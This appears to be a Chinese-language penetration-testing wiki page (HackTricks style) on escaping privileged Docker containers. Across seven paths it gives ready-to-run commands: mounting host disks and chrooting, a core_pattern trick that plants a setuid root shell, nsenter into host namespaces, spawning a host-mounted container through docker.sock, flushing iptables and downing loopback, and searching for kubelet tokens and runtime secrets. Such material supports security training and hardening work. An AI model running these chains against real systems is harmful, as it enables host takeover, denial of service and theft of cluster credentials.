# 从 `--privileged` 容器中逃逸

{{#include ../../../banners/hacktricks-training.md}}

## 概述

使用 `--privileged` 启动的容器并不只是一个比普通容器多几个权限的容器。实际上，`--privileged` 会移除或削弱若干默认的 runtime 保护，这些保护通常会将工作负载与危险的主机资源隔离开。具体效果依赖于 runtime 和主机，但对 Docker 来说通常表现为：

- 授予所有 capabilities
- 解除 device cgroup 限制
- 许多 kernel filesystems 不再以只读方式挂载
- 默认被屏蔽的 procfs 路径消失
- seccomp filtering 被禁用
- AppArmor confinement 被禁用
- SELinux isolation 被禁用或被更宽泛的标签取代

重要的后果是，特权容器通常不需要微妙的内核漏洞。在很多情况下，它可以直接与主机设备、面向主机的内核文件系统或 runtime 接口交互，然后转移（pivot）到主机 shell。

## `--privileged` 不会自动改变的东西

`--privileged` 并不会自动加入主机的 PID、network、IPC 或 UTS namespaces。特权容器仍然可以拥有私有的命名空间。这意味着一些逃逸链需要额外条件，例如：

- 主机的 bind mount
- host PID 共享
- 主机网络（host networking）
- 可见的主机设备
- 可写的 proc/sys 接口

这些条件在真实的错误配置中通常很容易满足，但它们在概念上与 `--privileged` 本身是分开的。

## 逃逸路径

### 1. 通过暴露的设备挂载主机磁盘

特权容器通常在 `/dev` 下能看到更多的设备节点。如果主机的块设备可见，最简单的逃逸方法就是挂载它并 `chroot` 到主机文件系统：
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
如果 root 分区不明显，先枚举块设备布局：
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
如果实际做法是将一个 setuid helper 放到可写的主机挂载点而不是使用 `chroot`，请记住并非所有文件系统都会支持 setuid 位。一个快速的主机端能力检查是：
```bash
mount | grep -v "nosuid"
```
这是有用的，因为位于 `nosuid` 文件系统下的可写路径对于经典的 "drop a setuid shell and execute it later" 工作流程来说要没那么有吸引力。

这里被滥用的弱化防护包括：

- 对设备的完全暴露
- 广泛的 capabilities，尤其是 `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. 挂载或重用主机 bind mount 并 `chroot`

如果主机根文件系统已经挂载在容器内，或者容器因为是 privileged 能够创建所需的挂载点，那么通常距离获得一个主机 shell 只差一次 `chroot`：
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
如果不存在主机根目录的 bind mount，但可以访问主机存储，则创建一个：
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
此路径滥用：

- 挂载限制被削弱
- 完整的 capabilities
- 缺乏 MAC 限制

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. 滥用可写的 `/proc/sys` 或 `/sys`

一个 `--privileged` 的重要后果是 procfs 和 sysfs 的防护变得更弱。这样可能会暴露通常被屏蔽或以只读方式挂载的面向主机的内核接口。

一个典型例子是 `core_pattern`：
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
其他高价值路径包括：
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
该路径利用：

- missing masked paths
- missing read-only system paths

相关页面：

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. 在基于挂载或命名空间的逃逸中使用全部 Capabilities

具有特权的容器会获得那些通常在标准容器中被移除的 capabilities，包括 `CAP_SYS_ADMIN`、`CAP_SYS_PTRACE`、`CAP_SYS_MODULE`、`CAP_NET_ADMIN` 等等。这通常足以在存在另一个可暴露面时，将本地立足点升级为宿主机逃逸。

一个简单的例子是挂载额外的文件系统并使用命名空间进入：
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
如果 host PID 也被共享，步骤会更短：
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
此路径滥用：

- 默认的特权 capabilities 集合
- 可选的主机 PID 共享

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. 通过运行时套接字逃逸

特权容器经常能够看到主机的运行时状态或套接字。如果可以访问 Docker、containerd 或 CRI-O 的套接字，最简单的方法通常是使用运行时 API 启动第二个具有主机访问权限的容器：
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
针对 containerd：
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
该路径滥用：

- privileged runtime exposure
- 通过 runtime 本身创建的 host bind mounts

相关页面：

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. 消除网络隔离的副作用

`--privileged` 本身并不会加入主机网络命名空间，但如果容器也具有 `--network=host` 或其他主机网络访问权限，完整的网络栈就会变得可变：
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
这并不总是能直接得到主机 shell，但可能导致拒绝服务、流量拦截，或访问仅限回环的管理服务。

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. 读取主机 secrets 和运行时状态

即使不能立刻获得干净的 shell 逃逸，特权容器通常仍有足够权限读取主机 secrets、kubelet 状态、运行时元数据，以及相邻容器的文件系统：
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
如果 `/var` 被挂载到主机或运行时目录可见，即使在获得主机 shell 之前，也可能足以进行 lateral movement 或 cloud/Kubernetes credential theft。

相关页面：

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## 检查

下面命令的目的是确认哪些 privileged-container escape families 可立即被利用。
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
这里值得注意的有：

- 完整的 capability 集合，尤其是 `CAP_SYS_ADMIN`
- 可写的 proc/sys 暴露
- 可见的主机设备
- 缺少 seccomp 和 MAC 限制
- runtime sockets 或主机 root bind mounts

其中任何一项都可能足以进行 post-exploitation。几项同时存在通常意味着容器在功能上只差一两条命令即可导致主机被攻破。

## 相关页面

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
